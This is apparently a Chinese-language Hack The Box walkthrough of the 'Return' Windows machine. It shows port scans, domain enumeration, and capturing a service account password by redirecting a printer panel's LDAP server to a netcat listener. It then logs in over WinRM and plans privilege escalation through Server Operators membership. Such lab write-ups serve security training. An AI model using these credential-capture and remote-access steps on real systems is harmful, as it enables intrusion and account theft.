## Return
```
[★]$ nmap -sC -sV 10.129.10.164
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 00:32 CST
Nmap scan report for 10.129.10.164
Host is up (0.013s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-03 06:50:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-03T06:50:59
|_  start_date: N/A
|_clock-skew: 18m27s

[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.10.164 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
[★]$ nmap -p$ports -sV -sC 10.129.10.164
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-03 06:56:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49909/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-03T06:57:26
|_  start_date: N/A
|_clock-skew: 18m27s

```
```
[★]$ echo '10.129.10.164 return.local0' | sudo tee -a /etc/hosts
10.129.10.164 return.local0
```
#### Nmap输出显示目标是一台Windows机器，端口为80 （Internet Information Services）和445（SMB）和5985 （Windows Remote Management）。
```
[★]$ enum4linux -A 10.129.10.164
<SNIP>
====================================================
|    Domain Information via RPC for 10.129.10.164    |
 ====================================================
[+] Domain: RETURN
[+] Domain SID: S-1-5-21-3750359090-2939318659-876128439
[+] Membership: domain member
<\SNIP>
```
#### 这表明主机是RETURN域的一部分。SMB不允许NULL或guest会话，所以可以把我们的注意力转向网站。
#### IIS 
![图片](images/2026020301.png)
#### 这显示了一个打印机管理面板，就像你在企业佳能、施乐和爱普生多功能打印机上看到的那样设备。导航到设置显示了用户名和域名。
### Foothold
#### 这些设备存储LDAP和SMB凭据，以便打印机从Active中查询用户列表目录，并且能够将扫描的文件保存到用户驱动器。这些配置页面通常允许要指定的域控制器或文件服务器。让我们在端口389 （LDAP）上建立一个侦听器，并指定我们的tun0服务器地址字段中的IP地址。
#### 翻译为在Server Address :10.10.14.93
```
[★]$ sudo nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.93] from (UNKNOWN) [10.129.10.164] 60925
0*`%return\svc-printer�
                       1edFg43012!!
```
#### 接收到连接，并显示svc-printer的凭据。从portscan我们看到WinRM端口打开。让我们使用evil-winrm工具连接到该服务。
```
[★]$ evil-winrm -i 10.129.10.164 -u svc-printer -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5

*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```
### Privilege Escalation
#### 枚举组成员关系显示svc-printer是Server Operators组的一部分
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 12:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```
#### 我们可以在这里了解更多关于这个组织的信息。该组的成员可以启动/停止系统服务。让我们修改服务二进制路径，获取反向shell。
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators
